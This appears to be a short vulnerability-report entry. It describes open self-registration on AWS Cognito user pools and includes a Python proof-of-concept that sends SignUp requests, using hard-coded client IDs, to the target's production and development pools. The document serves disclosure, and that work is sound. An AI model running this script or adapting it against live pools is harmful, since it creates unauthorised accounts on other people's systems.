vulnerabilities.pocDescription:
1. Send a POST request to the Cognito User Pool endpoint with the `SignUp` target
2. Provide a new username and password with the known client ID
3. The API returns HTTP 200 with a `UserSub` value, confirming account creation

The PoC script below demonstrates this for both production and development pools.

```python
import requests, json

POOLS = {
    "production": {
        "url": "https://cognito-idp.us-east-1.amazonaws.com/",
        "client_id": "3fqrju1hc5057lvbnfg1qddevk"
    },
    "development": {
        "url": "https://cognito-idp.ap-south-1.amazonaws.com/",
        "client_id": "3r3hsh5ue5iva4pgebdkm49g9b"
    }
}

for name, cfg in POOLS.items():
    headers = {
        "X-Amz-Target": "AWSCognitoIdentityProviderService.SignUp",
        "Content-Type": "application/x-amz-json-1.1"
    }
    payload = {
        "ClientId": cfg["client_id"],
        "Username": "test_user@example.com",
        "Password": "TestPass123!@#",
        "UserAttributes": [{"Name": "email", "Value": "test_user@example.com"}]
    }
    r = requests.post(cfg["url"], json=payload, headers=headers, timeout=10)
    print(f"{name}: HTTP {r.status_code}, UserSub: {r.json().get('UserSub', 'N/A')}")
```

